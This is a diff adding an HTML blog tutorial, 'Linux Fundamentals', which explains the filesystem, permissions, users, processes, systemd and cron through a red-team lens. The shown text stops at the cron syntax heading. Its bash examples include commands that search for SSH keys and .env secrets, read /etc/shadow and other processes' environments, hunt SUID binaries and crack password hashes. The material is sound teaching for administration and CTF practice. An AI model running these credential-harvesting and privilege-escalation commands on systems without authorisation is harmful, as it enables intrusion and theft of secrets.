@@ -1,0 +1,2508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>Linux Fundamentals — The Complete Foundation — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-learn">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-learn">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">Linux Fundamentals — The Complete Foundation</h1>
+    <div class="post-meta">
+      <time>2026-06-04</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">7 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/learn/" class="cat-badge cat-badge-link cat-learn">Learn</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">linux</span>
+          
+            <span class="tag">fundamentals</span>
+          
+            <span class="tag">bash</span>
+          
+            <span class="tag">permissions</span>
+          
+            <span class="tag">red-team</span>
+          
+            <span class="tag">privesc</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">Filesystem, permissions, users, processes, services, networking, bash, cron, logs, and a red team lens on every concept that matters in practice.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        <div class="block text-block"><p>Linux runs on the vast majority of servers, cloud infrastructure, embedded devices, and CTF targets you will ever encounter. Whether you're reading log files after an incident, escalating privileges on a box, writing automation, or just administering a machine — you need a genuine understanding of how Linux works, not just a list of commands to copy-paste.</p>
+<p>This guide builds from the filesystem up. Red team perspectives are embedded throughout — not because every operation is offensive, but because understanding <em>how attackers abuse things</em> is the fastest way to understand why they're designed the way they are.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">The Filesystem Hierarchy</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Linux uses a single unified tree rooted at <code>/</code>. Everything — files, devices, sockets, processes — is a file in this tree. There are no drive letters.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Directory</th><th>Purpose</th><th>Red team relevance</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`/`</td><td>Root of the entire filesystem</td><td>—</td>
+                </tr>
+              
+                <tr>
+                  <td>`/bin`</td><td>Essential user binaries (`ls`, `cp`, `cat`)</td><td>GTFO bins live here</td>
+                </tr>
+              
+                <tr>
+                  <td>`/sbin`</td><td>System binaries (`iptables`, `fdisk`)</td><td>Admin tools, often exploitable</td>
+                </tr>
+              
+                <tr>
+                  <td>`/usr/bin`</td><td>Most installed user programs</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`/usr/local/bin`</td><td>Locally compiled/installed programs</td><td>Often writable</td>
+                </tr>
+              
+                <tr>
+                  <td>`/etc`</td><td>System-wide config files</td><td>Credentials, SSH keys, cron, sudoers</td>
+                </tr>
+              
+                <tr>
+                  <td>`/home`</td><td>User home directories</td><td>`.ssh/`, `.bash_history`, config files</td>
+                </tr>
+              
+                <tr>
+                  <td>`/root`</td><td>Root&#39;s home directory</td><td>Flag files, SSH keys</td>
+                </tr>
+              
+                <tr>
+                  <td>`/tmp`</td><td>Temporary files, world-writable</td><td>Write exploits/payloads here</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var`</td><td>Variable data — logs, mail, spool</td><td>`/var/log/`, `/var/mail/`</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log`</td><td>System logs</td><td>Evidence of activity, credleaks</td>
+                </tr>
+              
+                <tr>
+                  <td>`/proc`</td><td>Kernel/process info as files</td><td>Process memory, environment, maps</td>
+                </tr>
+              
+                <tr>
+                  <td>`/sys`</td><td>Kernel hardware interface</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`/dev`</td><td>Device files</td><td>`/dev/null`, `/dev/shm` (tmpfs, noexec varies)</td>
+                </tr>
+              
+                <tr>
+                  <td>`/opt`</td><td>Optional/third-party software</td><td>Often poorly locked down</td>
+                </tr>
+              
+                <tr>
+                  <td>`/lib`, `/lib64`</td><td>Shared libraries</td><td>LD_PRELOAD hijack target</td>
+                </tr>
+              
+                <tr>
+                  <td>`/run`</td><td>Runtime data (PIDs, sockets)</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`/boot`</td><td>Kernel, bootloader</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`/media`, `/mnt`</td><td>Mount points</td><td>NFS mounts, interesting shares</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong><code>/proc</code> is particularly powerful.</strong> Every running process has a directory <code>/proc/&lt;PID&gt;/</code> containing:<br>
+- <code>cmdline</code> — the exact command that launched it<br>
+- <code>environ</code> — its full environment variables (may contain secrets)<br>
+- <code>fd/</code> — file descriptors (open files, sockets, pipes)<br>
+- <code>maps</code> — memory map (loaded libraries, heap, stack)<br>
+- <code>status</code> — UID, GID, threads, memory stats</p>
+<p><code>/proc/self</code> always points to your own process.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Navigating the filesystem</span>
+          </div>
+          <pre><code class="language-bash"># Where am I?
+pwd
+
+# List files (long format, hidden files, human sizes)
+ls -lah
+ls -lahR /etc/    # recursive
+
+# Navigate
+cd /etc
+cd ~              # home directory
+cd -              # previous directory
+
+# Find files
+find / -name &#34;*.conf&#34; 2&gt;/dev/null
+find /etc -type f -name &#34;*.conf&#34; 2&gt;/dev/null
+find / -name &#34;id_rsa&#34; 2&gt;/dev/null          # find SSH private keys
+find / -name &#34;*.log&#34; 2&gt;/dev/null
+find / -name &#34;wp-config.php&#34; 2&gt;/dev/null   # WordPress creds
+find / -name &#34;.env&#34; 2&gt;/dev/null            # dotenv secrets
+
+# Find recently modified files
+find /etc -mmin -60 2&gt;/dev/null            # modified in last 60 min
+find / -newer /tmp/reference 2&gt;/dev/null   # newer than a reference file
+
+# Read /proc for process info
+cat /proc/1/cmdline | tr &#39;\0&#39; &#39; &#39;          # PID 1 (init/systemd) command
+cat /proc/self/environ | tr &#39;\0&#39; &#39;\n&#39;      # your environment
+ls -la /proc/self/fd                       # your open file descriptors
+cat /proc/version                          # kernel version
+cat /proc/cpuinfo
+cat /proc/meminfo</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">File Permissions</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Every file and directory has an owner (user), an owning group, and three sets of permissions: <strong>owner</strong>, <strong>group</strong>, <strong>others</strong>.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">-rwxr-xr--  1  alice  devs  4096  Jun 4  script.sh
+│└┬┘└┬┘└┬┘
+│ │  │  └── others: read only (r--)
+│ │  └───── group:  read + execute (r-x)
+│ └──────── owner:  read + write + execute (rwx)
+└────────── file type: - = regular, d = directory, l = symlink, s = socket</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Permission bits:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Symbol</th><th>Octal</th><th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`r`</td><td>4</td><td>Read</td>
+                </tr>
+              
+                <tr>
+                  <td>`w`</td><td>2</td><td>Write</td>
+                </tr>
+              
+                <tr>
+                  <td>`x`</td><td>1</td><td>Execute (or enter directory)</td>
+                </tr>
+              
+                <tr>
+                  <td>`-`</td><td>0</td><td>No permission</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Octal notation adds the bits: <code>rwx</code> = 4+2+1 = <strong>7</strong>, <code>r-x</code> = 4+0+1 = <strong>5</strong>, <code>rw-</code> = 4+2+0 = <strong>6</strong>.</p>
+<p>So <code>chmod 755</code> = <code>rwxr-xr-x</code> (owner full, everyone else read+execute).</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Special Bits</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Bit</th><th>On file</th><th>On directory</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**SUID** (4xxx)</td><td>Runs as file&#39;s *owner*, not caller</td><td>—</td>
+                </tr>
+              
+                <tr>
+                  <td>**SGID** (2xxx)</td><td>Runs as file&#39;s *group*</td><td>New files inherit directory&#39;s group</td>
+                </tr>
+              
+                <tr>
+                  <td>**Sticky** (1xxx)</td><td>—</td><td>Only owner can delete their files (`/tmp`)</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>SUID is a privesc goldmine.</strong> If a binary runs as root (owner=root, SUID set), any code execution inside it gives you root.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">-rwsr-xr-x  root  root  /usr/bin/passwd
+    ↑ &#39;s&#39; in execute position = SUID set</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Access Control Lists (ACLs)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Beyond the basic rwx, <code>setfacl</code>/<code>getfacl</code> allow per-user, per-group rules on individual files — check these when standard permissions look locked but something still has access.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Permissions — read, change, and exploit</span>
+          </div>
+          <pre><code class="language-bash"># View permissions
+ls -la /etc/passwd
+stat /etc/shadow
+
+# Change permissions
+chmod 755 script.sh
+chmod u+x script.sh         # add execute for owner
+chmod o-w file.txt          # remove write for others
+chmod 600 ~/.ssh/id_rsa     # SSH key must be 600 or ssh refuses it
+
+# Change owner / group
+chown alice:devs file.txt
+chown -R www-data:www-data /var/www/html
+
+# Find SUID binaries (privesc hunting)
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2&gt;/dev/null
+
+# Find world-writable files/directories
+find / -perm -o+w -type f 2&gt;/dev/null
+find / -perm -o+w -type d 2&gt;/dev/null
+
+# Find world-writable directories (drop payloads)
+find / -writable -type d 2&gt;/dev/null
+
+# Read ACLs
+getfacl /etc/passwd
+getfacl -R /var/www/html
+
+# Check capabilities (another privesc vector)
+getcap -r / 2&gt;/dev/null
+# e.g. python3 cap_setuid+eip → can setuid to root</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Users, Groups &amp; Identity</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Linux identifies users and groups by <strong>UID</strong> (User ID) and <strong>GID</strong> (Group ID) — not by name. Names are just a lookup in <code>/etc/passwd</code>.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Key Files</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong><code>/etc/passwd</code></strong> — one line per user:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">root:x:0:0:root:/root:/bin/bash
+alice:x:1001:1001::/home/alice:/bin/bash
+nobody:x:65534:65534::/nonexistent:/usr/sbin/nologin</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>username : password_placeholder : UID : GID : comment : home : shell</code></p>
+<p>The <code>x</code> in the password field means the hash is in <code>/etc/shadow</code>. An empty field means no password. A <code>*</code> or <code>!</code> means login disabled.</p>
+<p><strong><code>/etc/shadow</code></strong> — password hashes, readable only by root:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">alice:$6$rounds=5000$salt$hash...:19120:0:99999:7:::</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Format: <code>$id$salt$hash</code> — <code>$6$</code> = SHA-512, <code>$5$</code> = SHA-256, <code>$1$</code> = MD5, <code>$2y$</code> = bcrypt.</p>
+<p><strong><code>/etc/group</code></strong> — group memberships:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">sudo:x:27:alice,bob
+docker:x:998:alice</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Privileged Groups to Know</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Group</th><th>Why it matters</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`sudo` / `wheel`</td><td>Members can run commands as root via sudo</td>
+                </tr>
+              
+                <tr>
+                  <td>`docker`</td><td>Mount host filesystem inside a container → root</td>
+                </tr>
+              
+                <tr>
+                  <td>`lxd` / `lxc`</td><td>Similar container escape to root</td>
+                </tr>
+              
+                <tr>
+                  <td>`disk`</td><td>Direct read/write access to block devices → read any file</td>
+                </tr>
+              
+                <tr>
+                  <td>`adm`</td><td>Read system logs (may contain credentials)</td>
+                </tr>
+              
+                <tr>
+                  <td>`shadow`</td><td>Read `/etc/shadow` → crack all password hashes</td>
+                </tr>
+              
+                <tr>
+                  <td>`root`</td><td>GID 0 — full system access</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Real vs Effective UID</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Every process has three UIDs: <strong>real</strong> (who launched it), <strong>effective</strong> (what it runs as — changed by SUID), and <strong>saved</strong> (the original effective, for privilege drop). <code>id</code> shows your current real and effective.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">User and identity enumeration</span>
+          </div>
+          <pre><code class="language-bash"># Who am I?
+id
+whoami
+
+# All logged-in users
+who
+w
+last            # login history
+lastlog         # last login per user
+
+# All users on the system
+cat /etc/passwd
+cat /etc/passwd | grep -v nologin | grep -v false   # users with shells
+awk -F: &#39;$3 &gt;= 1000 &amp;&amp; $3 &lt; 65534 {print $1}&#39; /etc/passwd   # human users
+
+# Groups
+cat /etc/group
+groups alice    # groups a user belongs to
+id alice
+
+# Sudo configuration
+cat /etc/sudoers
+cat /etc/sudoers.d/*
+sudo -l         # what can YOU run with sudo
+
+# Switch user
+su - alice      # switch to alice (needs password)
+sudo -i         # root shell if permitted
+sudo -u alice bash
+
+# Add user to sudo group (if you have permission)
+usermod -aG sudo alice
+
+# Read shadow file (if root or in shadow group)
+cat /etc/shadow
+
+# Crack hashes offline
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-512
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">File Manipulation &amp; Text Processing</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>These commands form the backbone of any shell session — reading files, searching content, transforming output, and chaining operations together.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Essential file and text commands</span>
+          </div>
+          <pre><code class="language-bash"># Reading files
+cat /etc/passwd
+less /var/log/syslog     # paginated, searchable with /
+tail -f /var/log/auth.log   # follow live (great for monitoring)
+head -20 /etc/passwd
+
+# Searching in files
+grep -r &#34;password&#34; /etc/ 2&gt;/dev/null        # recursive search
+grep -ri &#34;password&#34; /var/www/ 2&gt;/dev/null  # case insensitive
+grep -rn &#34;password&#34; . 2&gt;/dev/null          # show line numbers
+grep -v &#34;#&#34; /etc/ssh/sshd_config           # exclude comments
+grep -E &#34;root|admin&#34; /etc/passwd           # extended regex
+
+# Find strings in binaries
+strings /usr/bin/interesting_binary | grep -i pass
+
+# cut — extract fields from delimited text
+cut -d: -f1 /etc/passwd              # first field (username)
+cut -d: -f1,3 /etc/passwd            # username and UID
+
+# awk — field processing
+awk -F: &#39;{print $1, $3}&#39; /etc/passwd
+awk -F: &#39;$3 == 0 {print $1}&#39; /etc/passwd   # users with UID 0 (should only be root)
+
+# sed — stream editor / find-replace
+sed &#39;s/old/new/g&#39; file.txt
+sed -n &#39;10,20p&#39; file.txt              # print lines 10–20
+
+# sort, uniq
+cat /var/log/auth.log | grep &#34;Failed&#34; | awk &#39;{print $11}&#39; | sort | uniq -c | sort -rn
+# ↑ count failed SSH login attempts per source IP
+
+# wc — word/line count
+wc -l /etc/passwd
+
+# File type
+file /usr/bin/python3
+file mystery_file
+
+# Base64
+echo &#34;hello&#34; | base64
+echo &#34;aGVsbG8K&#34; | base64 -d
+
+# Hashing
+md5sum /etc/passwd
+sha256sum suspicious_binary
+
+# Copy / move / delete
+cp -r /opt/app /tmp/backup
+mv old_name new_name
+rm -rf /tmp/old_payload    # careful
+
+# Create / write
+touch empty_file
+echo &#34;content&#34; &gt; file.txt
+echo &#34;more&#34; &gt;&gt; file.txt
+printf &#34;line1\nline2\n&#34; &gt; file.txt</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">Process Management</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>A <strong>process</strong> is a running instance of a program. Every process has a PID, a parent PID (PPID), an owner (UID), and a set of open file descriptors.</p>
+<p><strong>Process states:</strong><br>
+- <code>R</code> — Running / Runnable<br>
+- <code>S</code> — Sleeping (interruptible)<br>
+- <code>D</code> — Sleeping (uninterruptible, usually I/O)<br>
+- <code>Z</code> — Zombie (finished but parent hasn't reaped it)<br>
+- <code>T</code> — Stopped (SIGSTOP or traced by debugger)</p>
+<p><strong>Signals — important ones:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Signal</th><th>Number</th><th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>SIGHUP</td><td>1</td><td>Hangup — reload config (daemons)</td>
+                </tr>
+              
+                <tr>
+                  <td>SIGINT</td><td>2</td><td>Interrupt (Ctrl+C)</td>
+                </tr>
+              
+                <tr>
+                  <td>SIGKILL</td><td>9</td><td>Kill immediately, cannot be caught</td>
+                </tr>
+              
+                <tr>
+                  <td>SIGTERM</td><td>15</td><td>Graceful terminate (can be caught)</td>
+                </tr>
+              
+                <tr>
+                  <td>SIGSTOP</td><td>19</td><td>Pause process (cannot be caught)</td>
+                </tr>
+              
+                <tr>
+                  <td>SIGCONT</td><td>18</td><td>Resume a stopped process</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Red team relevance:</strong> Killing monitoring/AV processes requires SIGKILL and root. Processes running as root with user-controlled input are privilege escalation targets. Background processes listening on sockets are pivot targets.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Process enumeration and management</span>
+          </div>
+          <pre><code class="language-bash"># Snapshot of all processes
+ps aux
+ps -eFf                      # full format with ppid
+ps aux | grep apache
+
+# Live process monitor
+top
+htop                         # better UI (may need installing)
+
+# Process tree
+pstree -p
+
+# Find process by name / port
+pgrep nginx
+pgrep -a sshd                # with full command line
+ss -tlnp                     # sockets with owning process
+netstat -tlnp                # same (older)
+lsof -i :80                  # what&#39;s on port 80
+lsof -p 1234                 # open files for PID 1234
+
+# Kill processes
+kill 1234             # SIGTERM (15)
+kill -9 1234          # SIGKILL
+killall nginx
+pkill -9 python3
+
+# Background / foreground
+long_command &amp;        # run in background
+jobs                  # list background jobs
+fg %1                 # bring job 1 to foreground
+bg %1                 # send to background
+Ctrl+Z                # suspend current process
+nohup ./payload &amp;     # survive terminal close
+disown %1             # detach from terminal entirely
+
+# Screen / tmux — persist sessions across disconnects
+screen -S mysession
+screen -ls
+screen -r mysession
+tmux new -s hack
+tmux ls
+tmux attach -t hack
+
+# Red team: read other processes&#39; environment (may have secrets)
+cat /proc/1337/environ 2&gt;/dev/null | tr &#39;\0&#39; &#39;\n&#39;
+strings /proc/1337/mem 2&gt;/dev/null   # requires root
+
+# Find processes running as root
+ps aux | awk &#39;$1==&#34;root&#34; {print}&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">Services &amp; systemd</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Modern Linux systems use <strong>systemd</strong> as PID 1 — it manages services (called <em>units</em>), handles boot order, logging (journald), and more.</p>
+<p>A service unit file at <code>/etc/systemd/system/myservice.service</code> or <code>/lib/systemd/system/</code> defines how the service starts, stops, restarts, and what user it runs as.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">ini</span>
+            
+          </div>
+          <pre><code class="language-ini">[Unit]
+Description=My Web App
+After=network.target
+
+[Service]
+User=www-data
+WorkingDirectory=/opt/app
+ExecStart=/usr/bin/python3 app.py
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Red team:</strong> If you can write to a service unit file (or the binary it calls), you control code that runs as whatever <code>User=</code> is set to — often root for system services. Unit files in writable paths are a classic privesc vector.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">systemd — managing and abusing services</span>
+          </div>
+          <pre><code class="language-bash"># Service status
+systemctl status ssh
+systemctl status nginx
+
+# Start / stop / restart / reload
+systemctl start nginx
+systemctl stop nginx
+systemctl restart nginx
+systemctl reload nginx      # reload config without restart
+
+# Enable / disable at boot
+systemctl enable ssh
+systemctl disable ssh
+
+# List all services
+systemctl list-units --type=service
+systemctl list-units --type=service --state=running
+
+# View service logs (journald)
+journalctl -u nginx
+journalctl -u nginx -f      # follow live
+journalctl -u nginx --since &#34;1 hour ago&#34;
+journalctl -xe              # last boot, verbose
+
+# Find writable service files (privesc check)
+find /etc/systemd/system /lib/systemd/system -writable 2&gt;/dev/null
+
+# Find services running as root with writable ExecStart binary
+systemctl list-units --type=service --state=running | awk &#39;{print $1}&#39; | \
+  xargs -I{} systemctl show {} --property=ExecStart,User 2&gt;/dev/null
+
+# Reload after editing unit file
+systemctl daemon-reload
+systemctl restart modified-service</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">Cron Jobs — Scheduled Tasks</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Cron</strong> runs commands on a schedule. It's one of the most common privilege escalation vectors because scripts run automatically — often as root — without anyone watching.</p>
+<p><strong>Cron syntax:</strong></p></div>
+
+      
+    
+
